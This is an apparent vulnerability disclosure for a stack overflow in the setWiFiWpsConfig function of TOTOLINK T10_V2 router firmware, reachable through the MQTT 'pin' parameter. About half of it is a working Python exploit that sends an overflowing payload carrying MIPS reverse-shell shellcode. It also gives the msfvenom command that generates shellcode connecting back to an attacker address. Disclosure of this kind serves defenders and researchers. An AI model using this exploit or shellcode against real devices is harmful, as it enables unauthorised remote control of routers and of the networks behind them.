Information
===========

**Vendor of the products**: TOTOLINK <br>

**Vendor's website**: http://www.totolink.cn <br>

**Reported by**: korey0sh1(korey0sh2@gmail.com) <br>

**Affected products**: TOTOLINK T10_V2 <br>

**Affected firmware version**: V5.9c.5061_B20200511 <br>

**Firmware download address**: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=16&ids=36 <br>

Overview
===========

**TOTOLINK T10_v2 V5.9c.5061_B20200511** has a **stack overflow** vulnerability detected at function **setWiFiWpsConfig**. Attackers can send dirty data by mqtt packet into parameter **pin** to control the return address and execute shellcode. <br>

Vulnerability details
=====================
The vulnerability is detected at **/lib/cste_modules/wps.so** <br>

In the function **setWiFiWpsConfig**, the content obtained by program through parameter **pin** given by MQTT data packet is passed to variable **v11**. Then, the variable **v11** will copy to the variable **v22**, however,**v22** is on the stack,but there isn't any length check of **v11**.So we can set **wscMode** = **1** and **wscPinMode** = **1** to execute **strncpy**,and set the length of **pin's content** very long to cause stack overflow. <br>
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/TOTOLINK/T10_V2/0.jpg) <br>

Above all, attackers can send a MQTT data packet and control the content of parameter **pin** to cause stack overflow. <br>

Proof of Code
====================
```python
from pwn import *
import paho.mqtt.client as mqtt
import threading

context(os = 'linux', arch = 'mips', log_level = 'debug')

buf =  ""
buf += "\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21"
buf += "\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24"
buf += "\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f"
buf += "\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf"
buf += "\x09\x1d\x0e\x3c\x09\x1d\xce\x35\xe4\xff\xae\xaf"
buf += "\x37\x02\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf"
buf += "\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01"
buf += "\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24"
buf += "\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02"
buf += "\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24"
buf += "\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28"
buf += "\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf"
buf += "\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += "\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf"
buf += "\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24"
buf += "\x0c\x01\x01\x01"

test = "a"*60 + "\x44\x03\x42"

client = mqtt.Client()
client.connect("192.168.55.1",1883,60)
client.publish('totolink/router/setting/setWiFiWpsConfig',payload='{"topicurl":"setting/setWiFiWpsConfig","WiFiIdx":"0","PINPBCRadio":"1","PINMode":"1","PIN":"'+test+'"}'+'bling'+buf)
```
PS:
---
The offset maybe different in each device. <br>
**\x44\x03\x42** is the address which shellcode in,to get the address,you need to use gdbserver. <br>
The shellcode is which made by msf to reverse the shell <br>
```python
sfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.2 LPORT=2333 -f py -o shellcode.txt
```




    
    

  
